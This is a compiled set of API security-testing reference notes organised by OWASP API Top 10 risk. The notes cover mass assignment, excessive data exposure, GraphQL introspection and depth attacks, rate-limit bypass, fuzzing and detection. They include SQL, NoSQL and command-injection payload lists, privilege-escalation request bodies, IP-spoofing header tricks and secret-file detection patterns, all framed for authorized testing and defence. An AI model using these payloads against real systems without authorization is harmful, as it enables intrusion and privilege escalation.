# Nested API References — Promoted

Preserved nested `references/api-reference.md` content from API sub-skills. Provenance paths are listed per section.


---

## Source: `api-authorization/exploiting-excessive-data-exposure-in-api/references/api-reference.md`

# API Reference: Excessive Data Exposure (OWASP API3)

## OWASP API3:2023 — Broken Object Property Level Authorization

### Description
API returns more data than the client needs. Sensitive fields like passwords,
tokens, internal IDs, or PII are included in responses without filtering.

## Sensitive Field Categories

| Category | Examples |
|----------|----------|
| Credentials | password, secret, token, api_key |
| PII | ssn, date_of_birth, credit_card |
| Internal | internal_id, debug_info, stack_trace |
| Financial | salary, bank_account, routing_number |

## PII Detection Regex Patterns

| Type | Pattern |
|------|---------|
| Email | `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}` |
| SSN | `\d{3}-\d{2}-\d{4}` |
| Credit Card | `\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}` |
| Phone | `\+?1?\d{10,15}` |
| IP Address | `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}` |

## Testing Methodology

### Step 1: Compare Response to Documentation
```bash
# Get actual response
curl -s https://api.target.com/users/me | jq 'keys'

# Compare with OpenAPI spec expected fields
```

### Step 2: Check for Sensitive Fields
```python
sensitive = ["password", "token", "ssn", "secret"]
for field in response_json:
    if any(s in field.lower() for s in sensitive):
        print(f"EXPOSED: {field}")
```

### Step 3: Test Different Roles
```bash
# As regular user, check if admin fields returned
curl -H "Authorization: Bearer $USER_TOKEN" \
     https://api.target.com/users/123 | jq '.role, .permissions'
```

## Python requests

### Fetch and Analyze
```python
resp = requests.get(url, headers={"Authorization": f"Bearer {token}"})
data = resp.json()
```

## Remediation Approaches

| Approach | Description |
|----------|-------------|
| Response filtering | Only return fields client needs |
| GraphQL field selection | Let client specify fields |
| View models / DTOs | Map internal model to public API |
| Role-based serialization | Different fields per role |

## Tools

### Postman Collection Runner
Automate response schema validation across endpoints.

### OWASP ZAP — Passive Scanner
Detects sensitive data in responses automatically.

### Swagger/OpenAPI Diff
```bash
openapi-diff expected-spec.yaml actual-responses.yaml
```


---

## Source: `api-authorization/exploiting-mass-assignment-in-rest-apis/references/api-reference.md`

# API Reference: Mass Assignment Vulnerability Testing

## OWASP API3:2023 — Broken Object Property Level Authorization

### Description
API accepts and processes fields that should not be client-settable.
Attackers add extra fields (role, isAdmin) to modify server-side properties.

## Common Vulnerable Fields

| Field | Impact |
|-------|--------|
| `role` / `isAdmin` | Privilege escalation |
| `permissions` | Authorization bypass |
| `verified` / `email_verified` | Account verification bypass |
| `balance` / `credits` | Financial manipulation |
| `plan` / `subscription` | Service tier elevation |

## Testing Methodology

### Step 1: Observe Normal Request
```bash
curl -X PUT https://api.target.com/users/me \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"name": "Test User"}'
```

### Step 2: Add Privilege Fields
```bash
curl -X PUT https://api.target.com/users/me \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"name": "Test User", "role": "admin", "isAdmin": true}'
```

### Step 3: Verify Changes
```bash
curl https://api.target.com/users/me -H "Authorization: Bearer $TOKEN"
```

## Python Testing Script

```python
import requests

base_payload = {"name": "Test"}
privilege_fields = {
    "role": "admin",
    "isAdmin": True,
    "permissions": ["*"],
}

for field, value in privilege_fields.items():
    payload = {**base_payload, field: value}
    resp = requests.put(url, json=payload, headers=headers)
    if resp.status_code == 200 and field in resp.text:
        print(f"VULNERABLE: {field} accepted")
```

## Framework-Specific Vulnerabilities

### Ruby on Rails
```ruby
# Vulnerable
User.new(params[:user])

# Fixed
User.new(params.require(:user).permit(:name, :email))
```

### Node.js/Express
```javascript
// Vulnerable
User.findByIdAndUpdate(id, req.body)

// Fixed
const { name, email } = req.body;
User.findByIdAndUpdate(id, { name, email })
```

### Django REST Framework
```python
# Vulnerable: all fields writable
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'

# Fixed: explicit fields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['name', 'email']
        read_only_fields = ['role', 'is_admin']
```

## Remediation
1. Use allowlists for acceptable fields (never blocklists)
2. Implement read-only fields for sensitive properties
3. Use separate DTOs for input and output
4. Validate request schema against OpenAPI spec


---

## Source: `api-authorization/testing-api-for-mass-assignment-vulnerability/references/api-reference.md`

# API Reference: Testing API for Mass Assignment Vulnerability

## Privilege Field Categories

| Category | Example Fields | Impact |
|----------|---------------|--------|
| Role elevation | role, userRole, account_type | Admin access |
| Admin flags | isAdmin, is_superuser | Full privileges |
| Permissions | permissions, scopes, groups | Arbitrary access |
| Account status | verified, is_active | Bypass verification |
| Financial | balance, credit, discount, price | Monetary fraud |
| Ownership | user_id, owner_id | Data theft |
| Internal | debug, is_featured | Hidden features |

## Framework-Specific Payloads

| Framework | Payload Pattern |
|-----------|----------------|
| Rails/ActiveRecord | `{"user": {"role": "admin"}}` |
| Django REST | `{"is_staff": true, "is_superuser": true}` |
| Express/Mongoose | `{"$set": {"role": "admin"}}` |
| Spring Boot | `{"authorities": [{"authority": "ROLE_ADMIN"}]}` |

## OWASP API3:2023 Mitigations

| Mitigation | Description |
|-----------|-------------|
| DTO/Input Schema | Explicit allowed fields per endpoint |
| Strong parameters | Framework allowlist (Rails) |
| Serializer fields | Django REST serializer definition |
| Property filter | Drop unknown fields before binding |

## Test Tools

| Tool | Purpose |
|------|---------|
| Burp Repeater | Manual parameter injection |
| Param Miner (Burp) | Hidden parameter discovery |
| Arjun | Automated parameter fuzzing |
| Postman | Request body manipulation |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `requests` | >=2.28 | HTTP API calls |
| `json` | stdlib | Payload construction |

## References

- OWASP API3:2023: https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
- Param Miner: https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943


---

## Source: `api-authorization/testing-for-sensitive-data-exposure/references/api-reference.md`

# API Reference: Testing for Sensitive Data Exposure

## requests Library

### TLS Verification
```python
# Check HTTP to HTTPS redirect
resp = requests.get("http://target.com/", allow_redirects=False)

# Check HSTS header
resp = requests.get("https://target.com/")
hsts = resp.headers.get("Strict-Transport-Security", "")
```

## Secret Detection Patterns
| Pattern | Regex | Example |
|---------|-------|---------|
| AWS Access Key | `AKIA[0-9A-Z]{16}` | AKIAIOSFODNN7EXAMPLE |
| Google API Key | `AIza[0-9A-Za-z\-_]{35}` | AIzaSyA... |
| Stripe Secret | `sk_live_[0-9a-zA-Z]{24,}` | sk_live_... |
| GitHub Token | `ghp_[a-zA-Z0-9]{36}` | ghp_xxxx... |
| Private Key | `-----BEGIN PRIVATE KEY-----` | PEM format |

## Exposed File Checks
| File | Risk |
|------|------|
| `.env` | Environment variables with secrets |
| `.git/config` | Git configuration (may contain tokens) |
| `config.json` | Application configuration |
| `.aws/credentials` | AWS access keys |
| `phpinfo.php` | Server configuration disclosure |

## Sensitive API Response Fields
Fields that should never appear in API responses:
- `password`, `password_hash`, `salt`
- `ssn`, `credit_card`, `cvv`
- `api_key`, `secret_key`, `private_key`
- `access_token`, `refresh_token`

## Cache-Control for Sensitive Pages
```
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

## References
- OWASP A02:2021 Cryptographic Failures: https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
- OWASP Sensitive Data Exposure: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/
- trufflehog: https://github.com/trufflesecurity/trufflehog
- gitleaks: https://github.com/gitleaks/gitleaks


---

## Source: `graphql/performing-graphql-depth-limit-attack/references/api-reference.md`

# API Reference — Performing GraphQL Depth Limit Attack

## Libraries Used
- **requests**: Send GraphQL queries with depth/width/batch payloads
- **time**: Measure response latency for resource exhaustion detection

## CLI Interface
```
python agent.py depth --url <endpoint> [--max-depth 20] [--auth-header "Bearer token"]
python agent.py circular --url <endpoint> --type-a User --field-a posts --type-b Post --field-b author [--depth 10]
python agent.py batch --url <endpoint> [--count 50]
python agent.py width --url <endpoint> [--width 50] [--depth 5]
```

## Core Functions

### `build_nested_query(field_name, depth, leaf)` — Construct nested query payload
Generates progressively deeper GraphQL queries for depth limit probing.

### `test_depth_limit(url, max_depth, headers)` — Probe depth enforcement
Sends queries at increasing depth (1 to max_depth). Classifies severity:
HIGH (>=15 allowed), MEDIUM (>=8), LOW (<8).

### `test_circular_query(url, type_a, field_a, type_b, field_b, depth)` — Test circular references
Builds alternating A.field_a -> B.field_b chains to test circular query handling.

### `test_batch_query(url, count, headers)` — Test batch query bypass
Sends array of N queries to check if batching bypasses per-query depth limits.

### `test_resource_exhaustion(url, width, depth, headers)` — Test wide+deep queries
Combines field width (aliases) with nesting depth. Flags SLOW_RESPONSE if >5s.

## Severity Classification
- **HIGH**: No depth limit or limit >= 15 levels
- **MEDIUM**: Depth limit 8-14 or batch queries accepted
- **LOW**: Depth limit < 8 with proper enforcement

## Dependencies
```
pip install requests
```


---

## Source: `graphql/performing-graphql-introspection-attack/references/api-reference.md`

# API Reference — Performing GraphQL Introspection Attack

## Libraries Used

| Library | Purpose |
|---------|---------|
| `requests` | Send GraphQL introspection queries and depth test payloads |
| `json` | Parse schema responses and format results |
| `argparse` | CLI argument parsing for URL, auth headers, depth limits |

## Installation

```bash
pip install requests
```

## CLI Interface

```bash
python agent.py introspect --url <graphql_endpoint> [--auth-header "Bearer token"]
python agent.py depth --url <graphql_endpoint> [--max-depth 10]
```

## Core Functions

### `run_introspection(url, headers)` — Execute `__schema` introspection query

```python
INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}
"""

def run_introspection(url, headers=None):
    """Execute full introspection query and extract schema details."""
    resp = requests.post(
        url,
        json={"query": INTROSPECTION_QUERY},
        headers=headers or {},
        timeout=30,
    )
    resp.raise_for_status()
    schema = resp.json().get("data", {}).get("__schema", {})

    types = [t for t in schema.get("types", []) if not t["name"].startswith("__")]
    queries = []
    mutations = []
    sensitive_fields = []

    for t in types:
        for field in (t.get("fields") or []):
            if t["name"] == schema.get("queryType", {}).get("name"):
                queries.append(field["name"])
            if t["name"] == schema.get("mutationType", {}).get("name"):
                mutations.append(field["name"])
            if any(kw in field["name"].lower() for kw in SENSITIVE_PATTERNS):
                sensitive_fields.append({"type": t["name"], "field": field["name"]})

    return {
        "types_count": len(types),
        "queries": queries,
        "mutations": mutations,
        "sensitive_fields": sensitive_fields,
        "introspection_enabled": True,
    }
```

### `test_depth_limit(url, max_depth, headers)` — Test query depth enforcement

```python
def test_depth_limit(url, max_depth=15, headers=None):
    """Send increasingly nested queries to detect missing depth limits."""
    results = []
    for depth in range(1, max_depth + 1):
        # Build a nested query using __typename
        nested = "{ __typename " * depth + "}" * depth
        query = f"query DepthTest {nested}"

        try:
            resp = requests.post(
                url,
                json={"query": query},
                headers=headers or {},
                timeout=10,
            )
            status = resp.status_code
            has_errors = "errors" in resp.json()
            results.append({
                "depth": depth,
                "status": status,
                "blocked": has_errors and status != 200,
            })
            if has_errors:
                return {
                    "max_allowed_depth": depth - 1,
                    "depth_limit_enforced": True,
                    "results": results,
                }
        except requests.Timeout:
            return {
                "max_allowed_depth": depth - 1,
                "depth_limit_enforced": True,
                "reason": "timeout",
                "results": results,
            }

    return {
        "max_allowed_depth": max_depth,
        "depth_limit_enforced": False,
        "severity": "high",
        "detail": f"No depth limit detected up to {max_depth} levels",
        "results": results,
    }
```

### `test_batch_query(url, headers)` — Test for batching attacks

```python
def test_batch_query(url, headers=None):
    """Test if the endpoint allows batched queries (alias-based brute force)."""
    batch = [
        {"query": '{ alias0: __typename }'},
        {"query": '{ alias1: __typename }'},
        {"query": '{ alias2: __typename }'},
    ]
    resp = requests.post(url, json=batch, headers=headers or {}, timeout=10)
    return {
        "batch_supported": resp.status_code == 200 and isinstance(resp.json(), list),
        "responses": len(resp.json()) if isinstance(resp.json(), list) else 0,
    }
```

## Sensitive Field Patterns

```python
SENSITIVE_PATTERNS = [
    "password", "token", "secret", "credential", "ssn",
    "credit_card", "api_key", "apikey", "private_key",
    "auth", "session", "otp", "pin", "cvv",
]
```

## Output Format

```json
{
  "url": "https://api.example.com/graphql",
  "introspection_enabled": true,
  "types_count": 45,
  "queries": ["users", "orders", "admin_dashboard"],
  "mutations": ["createUser", "deleteAccount", "updatePassword"],
  "sensitive_fields": [
    {"type": "User", "field": "password_hash"},
    {"type": "Session", "field": "auth_token"}
  ],
  "depth_limit": {
    "enforced": false,
    "max_tested": 15,
    "severity": "high"
  },
  "batch_queries": {
    "supported": true,
    "severity": "medium"
  }
}
```


---

## Source: `graphql/performing-graphql-security-assessment/references/api-reference.md`

# API Reference: GraphQL Security Assessment

## GraphQL Introspection Query

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types { name kind fields { name type { name kind } } }
  }
}
```

## Security Test Endpoints

| Test | Query | Expected Secure Response |
|------|-------|-------------------------|
| Introspection | `{ __schema { types { name } } }` | Error: introspection disabled |
| Depth limit | Nested `{ users { friends { ... } } }` | Error: max depth exceeded |
| Batch queries | `[{query: "..."}, {query: "..."}]` | Error or single-query only |
| Aliases | `{ a1: __typename a2: __typename ... }` | Error: alias limit exceeded |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `requests` | >=2.28 | HTTP client for GraphQL POST requests |
| `gql` | >=3.4 | Python GraphQL client with transport support |

## graphql-cop CLI

```bash
pip install graphql-cop
graphql-cop -t https://target.example.com/graphql
```

## clairvoyance (Schema Enumeration)

```bash
python3 -m clairvoyance -u <url> -w <wordlist> -o schema.json
```

## References

- GraphQL specification: https://spec.graphql.org/
- InQL Burp extension: https://github.com/doyensec/inql
- clairvoyance: https://github.com/nikitastupin/clairvoyance
- graphql-cop: https://github.com/dolevf/graphql-cop
- CSP Evaluator: https://csp-evaluator.withgoogle.com/


---

## Source: `rest/conducting-api-security-testing/references/api-reference.md`

# API Reference: API Security Testing Agent

## Overview

Tests REST and GraphQL APIs for OWASP API Security Top 10 vulnerabilities including BOLA, BFLA, mass assignment, rate limiting, JWT bypass, and GraphQL introspection disclosure. For authorized penetration testing only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| requests | >=2.28 | HTTP requests to target APIs |

## CLI Usage

```bash
python agent.py --base-url https://api.target.com --token <jwt> \
  --low-priv-token <jwt> --graphql --output report.json
```

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| `--base-url` | Yes | Target API base URL |
| `--token` | No | Auth bearer token for authenticated testing |
| `--low-priv-token` | No | Low-privilege token for BFLA testing |
| `--login-endpoint` | No | Login endpoint for rate limiting test (default: `/api/auth/login`) |
| `--graphql` | No | Test GraphQL introspection disclosure |
| `--output` | No | Output file (default: `api_security_report.json`) |

## Key Functions

### `test_bola(base_url, endpoint_template, id_field, valid_id, other_id, auth_token)`
Tests Broken Object Level Authorization by accessing another user's resource with own credentials.

### `test_bfla(base_url, admin_endpoints, low_priv_token)`
Tests admin endpoints with low-privilege tokens using GET, POST, DELETE methods.

### `test_mass_assignment(base_url, endpoint, auth_token, extra_fields)`
Sends undocumented fields (role, isAdmin) to update endpoints and verifies if they persist.

### `test_rate_limiting(base_url, endpoint, num_requests)`
Sends rapid requests to detect absence of rate limiting on authentication endpoints.

### `test_jwt_none_algorithm(base_url, endpoint, jwt_token)`
Forges JWT with `alg: none` to test for algorithm confusion vulnerabilities.

### `test_graphql_introspection(base_url, graphql_endpoint)`
Sends introspection query to check if full schema disclosure is enabled.

### `test_excessive_data_exposure(base_url, endpoint, auth_token, expected_fields)`
Compares API response fields against expected fields to identify over-exposure.

## OWASP API Top 10 Coverage

| OWASP ID | Vulnerability | Function |
|----------|--------------|----------|
| API1:2023 | Broken Object Level Authorization | `test_bola` |
| API3:2023 | Excessive Data Exposure | `test_excessive_data_exposure` |
| API4:2023 | Unrestricted Resource Consumption | `test_rate_limiting` |
| API5:2023 | Broken Function Level Authorization | `test_bfla` |
| API6:2023 | Mass Assignment | `test_mass_assignment` |


---

## Source: `rest/detecting-api-enumeration-attacks/references/api-reference.md`

# API Enumeration Attack Detection — API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| requests | `pip install requests` | WAF and SIEM API queries |

## Detection Techniques

| Technique | Indicator | Severity |
|-----------|-----------|----------|
| Sequential ID enumeration | /api/users/1, /api/users/2, ... | HIGH |
| Endpoint fuzzing | High 404 rate on /api/* paths | HIGH |
| Rate abuse | >50 API requests/minute from single IP | MEDIUM |
| Path discovery | Requests to /swagger, /api-docs, /graphql | HIGH |
| BOLA/IDOR probing | Access to other users' resource IDs | CRITICAL |

## NGINX Combined Log Format

```
$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"
```

## Common Enumeration Paths

| Pattern | Description |
|---------|-------------|
| `/api/v1/users/{id}` | User ID enumeration |
| `/api/v1/accounts/{uuid}` | Account UUID guessing |
| `/graphql?query={__schema}` | GraphQL introspection |
| `/swagger/v1/swagger.json` | API documentation discovery |
| `/api-docs`, `/.well-known` | Endpoint discovery |

## WAF Rule Categories

| Category | Description |
|----------|-------------|
| `rate-limit` | Request rate exceeds threshold |
| `api-abuse` | Automated API enumeration |
| `bola` | Broken Object Level Authorization |
| `scanner` | Known scanner/fuzzer user-agent |

## OWASP API Security Top 10

| ID | Risk |
|----|------|
| API1 | Broken Object Level Authorization |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Auth |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |

## External References

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [OWASP Testing Guide — API Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [ModSecurity API Protection Rules](https://coreruleset.org/)


---

## Source: `rest/detecting-shadow-api-endpoints/references/api-reference.md`

# API Reference: Shadow API Endpoint Detection

## OpenAPI 3.0 Specification Structure

### Loading Paths
```json
{
  "openapi": "3.0.0",
  "paths": {
    "/api/users": {
      "get": { "summary": "List users" },
      "post": { "summary": "Create user" }
    },
    "/api/users/{id}": {
      "get": { "summary": "Get user by ID" }
    }
  }
}
```

### Key Fields
| Field | Description |
|-------|-------------|
| `paths` | Map of URL paths to operations |
| `servers[].url` | Base URL for the API |
| `components.securitySchemes` | Authentication methods |

## Web Access Log Formats

### Apache/Nginx Combined Log
```
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /api/users HTTP/1.1" 200 2326
```

### Regex Pattern
```python
r'(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"(\S+)\s+(\S+)\s+\S+"\s+(\d+)\s+(\d+)'
```

| Group | Content |
|-------|---------|
| 1 | Client IP |
| 2 | Timestamp |
| 3 | HTTP Method |
| 4 | Request Path |
| 5 | Status Code |
| 6 | Response Size |

## Path Normalization Patterns

### ID replacement
```python
re.sub(r'/\d+', '/{id}', path)                    # /users/123 -> /users/{id}
re.sub(r'/[0-9a-f]{24,}', '/{id}', path)          # MongoDB ObjectId
re.sub(r'/[0-9a-f-]{36}', '/{uuid}', path)        # UUID v4
```

## OWASP API Security Top 10 (2023)

| # | Risk | Relevance to Shadow APIs |
|---|------|--------------------------|
| API1 | Broken Object Level Auth | Shadow endpoints may lack auth |
| API2 | Broken Authentication | Undocumented auth bypass |
| API5 | Broken Function Level Auth | Admin endpoints exposed |
| API9 | Improper Inventory Management | Core shadow API risk |

## Akamai API Discovery

### List discovered APIs
```http
GET https://cloud.akamai.com/api-gateway/v1/apis/discovered
Authorization: Bearer {token}
```

## AWS API Gateway — Export API
```bash
aws apigateway get-export \
    --rest-api-id abc123 \
    --stage-name prod \
    --export-type oas30 \
    exported-api.json
```

## Burp Suite Enterprise — API Scan
```http
POST https://burp-enterprise/api/v1/scans
Content-Type: application/json

{
  "scan_type": "api_discovery",
  "target_url": "https://api.example.com",
  "openapi_spec": "https://api.example.com/openapi.json"
}
```


---

## Source: `rest/exploiting-api-injection-vulnerabilities/references/api-reference.md`

# API Reference: API Injection Vulnerability Testing

## OWASP API Security Top 10

| # | Risk | Description |
|---|------|-------------|
| API1 | Broken Object Level Auth | Accessing other users' data |
| API2 | Broken Authentication | Weak auth mechanisms |
| API3 | Broken Object Property Level Auth | Mass assignment |
| API8 | Security Misconfiguration | Injection via misconfig |
| API10 | Unsafe Consumption | Server-side injection |

## SQL Injection Payloads

### Error-Based
```
' OR '1'='1
' UNION SELECT NULL,NULL--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Time-Based Blind
```
' AND SLEEP(5)--
' AND pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
```

## NoSQL Injection Payloads

### MongoDB Operator Injection
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}}
{"username": {"$regex": "admin.*"}}
```

### Where Clause Injection
```json
{"$where": "this.password == 'test'"}
```

## Command Injection Payloads

### Unix
```
; id
| whoami
$(id)
`id`
```

### Blind Command Injection
```
; sleep 5
| ping -c 5 127.0.0.1
$(sleep 5)
```

## Python requests Library

### GET with Parameters
```python
import requests
resp = requests.get(url, params={"id": payload}, timeout=10, verify=False)
```

### POST with JSON Body
```python
resp = requests.post(url, json={"field": payload}, timeout=10)
```

### Response Analysis
| Attribute | Usage |
|-----------|-------|
| `resp.status_code` | HTTP status |
| `resp.text` | Response body |
| `resp.elapsed.total_seconds()` | Response time |
| `len(resp.content)` | Response size |

## Error Signatures

### SQL Databases
| Database | Error Pattern |
|----------|---------------|
| MySQL | `You have an error in your SQL syntax` |
| PostgreSQL | `ERROR: syntax error at or near` |
| MSSQL | `Unclosed quotation mark` |
| Oracle | `ORA-01756` |
| SQLite | `SQLITE_ERROR` |

## Burp Suite API

### Initiate Scan
```http
POST https://burp:1337/v0.1/scan
Content-Type: application/json

{
  "urls": ["https://api.target.com/v1/users"],
  "scan_configurations": [{"name": "Audit checks - SQL injection"}]
}
```


---

## Source: `rest/implementing-api-security-testing-with-42crunch/references/api-reference.md`

# API Reference: Implementing API Security Testing with 42Crunch

## 42Crunch API Security Audit

```bash
# Upload OpenAPI spec for audit
curl -X POST https://platform.42crunch.com/api/v2/apis \
  -H "X-API-KEY: $CRUNCH_KEY" \
  -F "specfile=@openapi.yaml"

# Get audit report
curl https://platform.42crunch.com/api/v2/apis/{api_id}/assessmentreport \
  -H "X-API-KEY: $CRUNCH_KEY"
```

## OWASP API Security Top 10 (2023)

| ID | Risk | Audit Check |
|----|------|-------------|
| API1 | Broken Object Level Auth | BOLA path patterns |
| API2 | Broken Authentication | Security schemes |
| API3 | Broken Object Property Auth | Mass assignment |
| API4 | Unrestricted Resource Consumption | Rate limits |
| API5 | Broken Function Level Auth | Admin endpoints |
| API8 | Security Misconfiguration | HTTP, CORS, headers |

## Security Score Deductions

| Issue | Deduction | Severity |
|-------|-----------|----------|
| No security schemes | -30 | CRITICAL |
| Security disabled on endpoint | -25 | CRITICAL |
| No global security | -20 | HIGH |
| HTTP server URL | -15 | HIGH |
| No input schema | -15 | HIGH |
| Mass assignment risk | -10 | MEDIUM |
| Unbounded string param | -5 | MEDIUM |

## CI/CD Integration (GitHub Actions)

```yaml
- uses: 42Crunch/api-security-audit-action@v3
  with:
    api-token: ${{ secrets.CRUNCH_TOKEN }}
    min-score: 70
```

### References

- 42Crunch Platform: https://42crunch.com/
- OWASP API Top 10: https://owasp.org/API-Security/
- 42Crunch GitHub Action: https://github.com/42Crunch/api-security-audit-action


---

## Source: `rest/performing-api-fuzzing-with-restler/references/api-reference.md`

# RESTler API Fuzzing — API Reference

## Installation

```bash
git clone https://github.com/microsoft/restler-fuzzer.git
python3 ./build-restler.py --dest_dir /opt/restler
```

## RESTler CLI Commands

| Command | Description |
|---------|-------------|
| `Restler compile --api_spec <spec>` | Compile OpenAPI spec to fuzzing grammar |
| `Restler test --grammar_file <g>` | Smoke test — validate endpoint reachability |
| `Restler fuzz-lean --grammar_file <g>` | Quick fuzz — one pass with all checkers |
| `Restler fuzz --grammar_file <g>` | Full fuzz — extended fuzzing campaign |

## Key CLI Flags

| Flag | Description |
|------|-------------|
| `--grammar_file` | Path to compiled grammar.py |
| `--dictionary_file` | Custom fuzzing dictionary (dict.json) |
| `--settings` | Engine settings JSON file |
| `--target_ip` | Target API hostname or IP |
| `--target_port` | Target API port |
| `--time_budget` | Max hours to run (fuzz/fuzz-lean) |
| `--enable_checkers` | Space-separated checker names |
| `--no_ssl` | Disable TLS verification |

## Security Checkers

| Checker | Detects |
|---------|---------|
| UseAfterFree | Accessing deleted resources |
| NamespaceRule | Cross-tenant data access |
| ResourceHierarchy | Wrong parent resource ID access |
| LeakageRule | Sensitive data in error responses |
| InvalidDynamicObject | Malformed object ID handling |
| PayloadBody | Request body injection flaws |

## Output Directory Structure

| Path | Contents |
|------|----------|
| `ResponseBuckets/runSummary.json` | Aggregated run statistics |
| `bug_buckets/` | Individual bug report files |
| `Compile/grammar.py` | Generated fuzzing grammar |
| `Compile/dict.json` | Fuzzing dictionary |

## External References

- [RESTler GitHub](https://github.com/microsoft/restler-fuzzer)
- [RESTler Research Paper](https://patricegodefroid.github.io/public_psfiles/icse2019.pdf)
- [Schemathesis Alternative](https://github.com/schemathesis/schemathesis)


---

## Source: `rest/performing-api-inventory-and-discovery/references/api-reference.md`

# API Inventory and Discovery — API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| requests | `pip install requests` | HTTP probing and spec fetching |

## Common API Discovery Paths

| Path | Description |
|------|-------------|
| `/api/v1`, `/api/v2` | Versioned REST API roots |
| `/swagger.json` | Swagger 2.0 specification |
| `/openapi.json` | OpenAPI 3.x specification |
| `/graphql` | GraphQL endpoint |
| `/graphiql`, `/playground` | GraphQL IDE (introspection enabled) |
| `/api-docs`, `/docs` | API documentation page |
| `/.well-known/openid-configuration` | OIDC discovery |
| `/health`, `/metrics` | Health/monitoring endpoints |

## OpenAPI Spec Parsing

```python
import requests
spec = requests.get("https://target.com/openapi.json").json()
for path, methods in spec["paths"].items():
    for method, details in methods.items():
        print(f"{method.upper()} {path} deprecated={details.get('deprecated', False)}")
```

## JavaScript API Extraction Patterns

| Pattern | Matches |
|---------|---------|
| `fetch("/<path>")` | Fetch API calls |
| `axios.get("/<path>")` | Axios HTTP calls |
| `"/api/v1/<resource>"` | String literal API paths |
| `"/v2/<resource>"` | Versioned API references |

## API Risk Classification

| Category | Risk | Examples |
|----------|------|---------|
| Admin/Internal | HIGH | `/admin/api`, `/internal/` |
| GraphQL exposed | HIGH | `/graphql` with introspection |
| Documentation public | MEDIUM | `/swagger.json`, `/api-docs` |
| Deprecated/zombie | HIGH | Deprecated but still responding |
| Standard versioned | LOW | `/api/v2/users` |

## OWASP API9:2023 — Improper Inventory Management

| Issue | Description |
|-------|-------------|
| Shadow APIs | Undocumented endpoints deployed without review |
| Zombie APIs | Deprecated versions still accessible |
| Missing authentication | Endpoints skipping auth middleware |
| Version sprawl | Multiple API versions maintained simultaneously |

## External References

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [Swagger/OpenAPI Spec](https://swagger.io/specification/)
- [Kiterunner API Discovery](https://github.com/assetnote/kiterunner)


---

## Source: `rest/performing-api-rate-limiting-bypass/references/api-reference.md`

# API Rate Limiting Bypass — API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| requests | `pip install requests` | HTTP request sending with custom headers |

## Rate Limit Response Headers

| Header | Description |
|--------|-------------|
| `X-RateLimit-Limit` | Maximum requests per window |
| `X-RateLimit-Remaining` | Requests remaining in window |
| `X-RateLimit-Reset` | Timestamp when limit resets |
| `Retry-After` | Seconds to wait before retrying |
| `RateLimit-Policy` | IETF draft rate limit policy |

## IP Spoofing Bypass Headers

| Header | Description |
|--------|-------------|
| `X-Forwarded-For` | Standard proxy forwarding header |
| `X-Real-IP` | NGINX real client IP |
| `X-Originating-IP` | Client originating IP |
| `X-Client-IP` | Client IP identifier |
| `True-Client-IP` | Akamai/CDN client IP |
| `CF-Connecting-IP` | Cloudflare client IP |
| `Forwarded` | RFC 7239 forwarded header |

## Bypass Techniques

| Technique | Description | Severity |
|-----------|-------------|----------|
| Header IP rotation | Rotate X-Forwarded-For per request | HIGH |
| HTTP method switching | GET rate-limited but POST is not | MEDIUM |
| Path variation | `/api/users` vs `/api/users/` | MEDIUM |
| Case variation | `/API/Users` vs `/api/users` | MEDIUM |
| URL encoding | `%2Fapi%2Fusers` instead of `/api/users` | MEDIUM |
| Null byte injection | Append `%00` to URL path | HIGH |
| API version switching | `/v1/users` vs `/v2/users` | MEDIUM |
| Parameter pollution | Duplicate query parameters | MEDIUM |

## OWASP API4:2023 — Unrestricted Resource Consumption

| Risk | Description |
|------|-------------|
| Missing rate limits | No throttling on sensitive endpoints |
| Per-IP only limits | Bypassed with header spoofing |
| No auth-based limiting | Rate limit tied to IP, not user |
| Inconsistent enforcement | Different limits per method/version |

## External References

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [IETF RateLimit Header Fields](https://datatracker.ietf.org/doc/draft-ietf-httpapi-ratelimit-headers/)
- [HackTricks Rate Limit Bypass](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass)


---

## Source: `rest/performing-api-security-testing-with-postman/references/api-reference.md`

# API Security Testing with Postman — API Reference

## Tools

| Tool | Install | Purpose |
|------|---------|---------|
| Newman | `npm install -g newman` | CLI runner for Postman collections |
| Postman | Desktop app from postman.com | Collection creation and manual testing |

## Newman CLI Commands

| Command | Description |
|---------|-------------|
| `newman run <collection.json>` | Execute collection |
| `newman run <col> -e <env.json>` | Run with environment variables |
